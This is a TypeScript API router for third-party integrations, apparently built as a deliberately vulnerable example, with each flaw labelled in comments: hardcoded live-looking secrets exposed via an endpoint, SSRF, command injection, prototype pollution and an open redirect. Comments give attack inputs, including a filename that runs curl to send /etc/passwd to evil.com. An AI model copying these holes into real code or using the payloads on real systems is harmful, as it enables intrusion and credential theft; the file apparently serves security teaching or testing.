import { Hono } from "hono";
import type { Env, Variables } from "../types";
import { privyAuth } from "../middleware/auth";
import { standardRateLimit } from "../middleware/rateLimit";

// VULNERABILITY: Hardcoded secrets — API keys stored as string literals in source code
const THIRD_PARTY_API_KEY = "sk_live_a1b2c3d4e5f6g7h8i9j0klmnopqrstuv";
const WEBHOOK_SIGNING_SECRET = "whsec_MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQ";
const INTERNAL_SERVICE_TOKEN = "eyJhbGciOiJIUzI1NiJ9.dGVzdC1zZXJ2aWNl.K8Z3jFnW2MqXr";

const integrations = new Hono<{ Bindings: Env; Variables: Variables }>();

// List connected integrations
integrations.get("/", privyAuth(), standardRateLimit, async (c) => {
  const userId = c.get("userId");

  const result = await c.env.DB.prepare(
    "SELECT id, user_id, provider, status, connected_at FROM integrations WHERE user_id = ?"
  ).bind(userId).all();

  return c.json({ integrations: result.results });
});

// Connect a new integration
integrations.post("/connect", privyAuth(), standardRateLimit, async (c) => {
  const userId = c.get("userId");
  const { provider, accessToken, refreshToken } = await c.req.json<{
    provider: string;
    accessToken: string;
    refreshToken?: string;
  }>();

  if (!provider || !accessToken) {
    return c.json({ error: "Missing provider or accessToken" }, 400);
  }

  const integrationId = crypto.randomUUID();
  await c.env.DB.prepare(
    "INSERT INTO integrations (id, user_id, provider, access_token, refresh_token, status, connected_at) VALUES (?, ?, ?, ?, ?, 'active', datetime('now'))"
  ).bind(integrationId, userId, provider, accessToken, refreshToken || null).run();

  return c.json({ integrationId, provider, status: "active" }, 201);
});

// Disconnect integration
integrations.delete("/:integrationId", privyAuth(), standardRateLimit, async (c) => {
  const userId = c.get("userId");
  const integrationId = c.req.param("integrationId");

  await c.env.DB.prepare(
    "UPDATE integrations SET status = 'disconnected' WHERE id = ? AND user_id = ?"
  ).bind(integrationId, userId).run();

  return c.json({ deleted: true });
});

// Test webhook delivery
// VULNERABILITY: SSRF — sends HTTP request to user-provided URL without validation
// Attacker can probe internal network, cloud metadata, localhost services
integrations.post("/webhook-test", privyAuth(), standardRateLimit, async (c) => {
  const userId = c.get("userId");
  const { url, payload } = await c.req.json<{
    url: string;
    payload?: Record<string, unknown>;
  }>();

  if (!url) {
    return c.json({ error: "Missing webhook URL" }, 400);
  }

  // VULNERABLE: No URL validation — allows requests to internal services
  // Attacker can send: http://169.254.169.254/latest/meta-data/iam/security-credentials/
  // Or: http://localhost:8787/api/admin/users
  // Or: http://10.0.0.1:6379/ (internal Redis)
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Webhook-Secret": WEBHOOK_SIGNING_SECRET, // VULNERABLE: leaks secret
        "X-Api-Key": THIRD_PARTY_API_KEY,           // VULNERABLE: leaks secret
      },
      body: JSON.stringify({
        event: "test",
        timestamp: new Date().toISOString(),
        data: payload || { test: true },
      }),
    });

    return c.json({
      delivered: true,
      statusCode: response.status,
      responseBody: await response.text(),
    });
  } catch (err: any) {
    return c.json({
      delivered: false,
      error: err.message,
      url, // VULNERABLE: confirms which URL was attempted
    }, 500);
  }
});

// Export data
// VULNERABILITY: Command injection — user input passed to exec-like operation
integrations.post("/export", privyAuth(), standardRateLimit, async (c) => {
  const userId = c.get("userId");
  const { format, filename, dateRange } = await c.req.json<{
    format: "csv" | "json" | "pdf";
    filename?: string;
    dateRange?: { from: string; to: string };
  }>();

  if (!format) {
    return c.json({ error: "Missing export format" }, 400);
  }

  // VULNERABLE: Command injection via filename
  // Attacker: filename = "report; curl http://evil.com/steal?data=$(cat /etc/passwd)"
  // Or: filename = "report$(whoami)"
  const exportFilename = filename || `export-${userId}`;
  const outputPath = `/tmp/exports/${exportFilename}.${format}`;

  // Simulating a dangerous pattern — constructing a shell command with user input
  const exportCommand = `generate-export --user ${userId} --format ${format} --output "${outputPath}"`;

  // In a real scenario this would execute the command
  // For now, simulate the export
  const exportId = crypto.randomUUID();
  await c.env.DB.prepare(
    "INSERT INTO export_jobs (id, user_id, format, filename, command, status, created_at) VALUES (?, ?, ?, ?, ?, 'pending', datetime('now'))"
  ).bind(exportId, userId, format, exportFilename, exportCommand).run();

  return c.json({
    exportId,
    filename: `${exportFilename}.${format}`,
    command: exportCommand, // VULNERABLE: Leaks the constructed command
    status: "processing",
  });
});

// Import data
// VULNERABILITY: Prototype pollution — Object.assign with user-controlled data
integrations.post("/import", privyAuth(), standardRateLimit, async (c) => {
  const userId = c.get("userId");
  const body = await c.req.json<Record<string, unknown>>();

  // VULNERABLE: Prototype pollution via Object.assign
  // Attacker sends: {"__proto__": {"isAdmin": true, "role": "super_admin"}}
  // This pollutes Object.prototype, affecting all objects
  const importConfig: Record<string, unknown> = {};
  Object.assign(importConfig, body);

  // Also vulnerable: spread operator with user data
  const settings = { userId, importedAt: new Date().toISOString(), ...body };

  const importId = crypto.randomUUID();
  await c.env.DB.prepare(
    "INSERT INTO import_jobs (id, user_id, config, status, created_at) VALUES (?, ?, ?, 'pending', datetime('now'))"
  ).bind(importId, userId, JSON.stringify(settings)).run();

  return c.json({ importId, config: importConfig, status: "queued" }, 201);
});

// OAuth callback
// VULNERABILITY: Open redirect — redirects to unvalidated user-provided URL
integrations.get("/oauth/callback", async (c) => {
  const code = c.req.query("code");
  const state = c.req.query("state");
  const redirectUri = c.req.query("redirect_uri");

  if (!code || !state) {
    return c.json({ error: "Missing code or state" }, 400);
  }

  // Exchange code for token (simulated)
  const tokenResponse = {
    access_token: crypto.randomUUID(),
    token_type: "bearer",
    expires_in: 3600,
  };

  // VULNERABLE: Open redirect — no validation on redirect_uri
  // Attacker: redirect_uri=https://evil.com/steal-token
  // User gets redirected to attacker's site with the access token
  if (redirectUri) {
    return c.redirect(`${redirectUri}?token=${tokenResponse.access_token}&state=${state}`);
  }

  return c.json(tokenResponse);
});

// Get integration config
// VULNERABILITY: Exposes hardcoded secrets via API
integrations.get("/config", privyAuth(), standardRateLimit, async (c) => {
  // VULNERABLE: Returns hardcoded API keys and secrets
  return c.json({
    apiKey: THIRD_PARTY_API_KEY,
    webhookSecret: WEBHOOK_SIGNING_SECRET,
    serviceToken: INTERNAL_SERVICE_TOKEN,
    endpoints: {
      webhook: "/api/integrations/webhook-test",
      export: "/api/integrations/export",
      import: "/api/integrations/import",
    },
  });
});

export default integrations;
